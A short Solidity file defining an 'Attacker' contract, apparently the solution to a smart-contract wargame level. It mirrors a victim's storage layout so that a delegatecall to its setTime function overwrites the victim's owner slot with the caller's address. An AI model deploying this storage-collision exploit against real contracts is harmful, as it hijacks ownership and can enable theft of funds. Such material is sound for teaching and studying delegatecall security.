// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 nothing) external {
        owner = msg.sender;
    }
}
